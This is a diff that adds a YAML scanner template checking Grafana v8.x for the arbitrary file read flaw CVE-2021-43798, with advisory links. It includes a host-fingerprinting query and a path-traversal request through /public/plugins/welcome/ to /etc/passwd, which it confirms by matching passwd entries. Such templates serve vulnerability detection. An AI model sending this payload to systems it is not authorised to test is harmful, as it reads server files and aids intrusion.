@@ -1,0 +1,21 @@
+name: Grafana v8.x Arbitrary File Read CVE-2021-43798
+manual: true
+query: app="grafana_labs-company products" || product="Grafana_Labs-Company Products"
+  || company="Grafana Labs " || title="grafana"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /public/plugins/welcome/../../../../../../../../../etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"root:x:") && response.body.bcontains(b"daemon:x:")
+expression: r0()
+detail:
+  links:
+  - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
+  - https://nosec.org/home/detail/4914.html
+  - https://github.com/jas502n/Grafana-VulnTips
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-43798
+  - https://mp.weixin.qq.com/s/DTkVTtbndaMWL9WGzaI32A
+  description: Grafana is an open-source platform for monitoring and observability.
+  tags: fileread
